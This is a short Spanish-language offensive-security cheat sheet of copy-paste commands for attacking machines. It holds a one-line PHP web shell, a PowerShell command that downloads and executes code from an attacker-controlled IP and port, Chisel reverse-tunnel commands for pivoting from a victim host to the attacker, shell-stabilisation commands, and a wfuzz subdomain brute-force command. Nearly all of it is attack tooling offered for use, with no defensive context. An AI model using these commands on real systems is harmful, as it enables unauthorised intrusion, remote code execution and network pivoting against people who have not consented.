# Cheatsheet
Cosas copypaste

# Reverse Shells

Web Shell PHP
```
<?php system($_GET[cmd]);?>
```

# Powershell

Descargar binarios
```
powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.binario')
```

# PostExplotacion

## Chisel

Atacante
```
./chisel server --reverse -p ATACKER_PORT
```

Víctima
```
./chisel client ATTACKER_IP:ATTACKER_PORT R:VICTIM_IP:VICTIM_PORT
```

## Mejorar Shell

Linux
```
script /dev/null -c bash
```
```
stty raw -echo ;fg
```
```
reset xterm
```
```
export TERM=xterm
```
```
export SHELL=bash
```

# Enumeracion

## Directory Listing & subdomain discovering

wfuzz

```
wfuzz -c --hc=404 -t 200 -w /usr/share/seclist/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.dominio.ext" url
```



